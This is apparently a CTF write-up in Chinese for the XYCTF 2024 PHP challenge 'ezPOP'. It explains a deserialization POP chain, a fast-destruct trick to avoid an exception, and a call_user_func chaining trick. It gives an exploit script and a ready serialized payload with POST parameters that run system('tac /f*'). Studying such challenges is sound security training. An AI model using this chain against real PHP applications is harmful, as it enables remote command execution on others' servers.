# ezPOP

> 分类：Web

## 题目描述
PHP 反序列化 POP 链题。链子为 `CCC::__destruct -> AAA::__toString -> BBB::__get`，最终在 `BBB::__get` 中执行 `call_user_func($a,$b)($c)($d);`。需要理解 Fast-destruct 绕过抛错，以及如何利用 `current`/`sprintf` 等函数让 `call_user_func` 返回 `system` 并传参执行命令。

## 考察知识点
- PHP 反序列化 POP 链
- Fast-destruct（删除末尾 `}` 快速触发 `__destruct` 绕过抛异常）
- `call_user_func` + PHP 动态执行函数特性
- 数组函数 `current`/`array_pop`/`implode` 控制返回值

## 解法
关键源码：
```php
class BBB {
    public function __get($name) {
        $a=$_POST['a']; $b=$_POST; $c=$this->c; $d=$this->d;
        if (isset($b['a'])) { unset($b['a']); }
        call_user_func($a,$b)($c)($d);
    }
}
```
`$b = $_POST`（去除了 a），`call_user_func($a,$b)` 需要返回一个函数字符串。用 `current($_POST)` 返回 `$_POST` 当前元素（可控为 `sprintf`），`sprintf` 返回其参数字符串 `system`，再通过 `($c)($d)` 调用 `system('tac /f*')`。

exp：
```php
<?php
class AAA { public $s; public $a; }
class BBB { public $c; public $d; }
class CCC { public $c; }
$b=new BBB();
$a=new AAA();
$c=new CCC();
$b->c="system";
$b->d="tac /f*";
$a->s=$b;
$c->c=$a;
echo serialize($c);
```
生成后删除末尾 `}`（Fast-destruct）。

payload：
```
?xy=O:3:"CCC":1:{s:1:"c";O:3:"AAA":2:{s:1:"s";O:3:"BBB":2:{s:1:"c";s:6:"system";s:1:"d";s:7:"tac /f*";}s:1:"a";N;}
POST: a=current&b=sprintf
```

其它等价姿势：`a=array_pop&b=array_pop` 或 `a=implode&b=...`。

## 参考答案
（未给出，见截图）

## 来源
- 作者：Z3r4y（uuzeray） | https://blog.csdn.net/uuzeray/article/details/138274291
- 作者：HvAng | https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html
- 作者：J1rrY | https://j1rry-learn.github.io/posts/2024-xyctf-webmisc-wp/
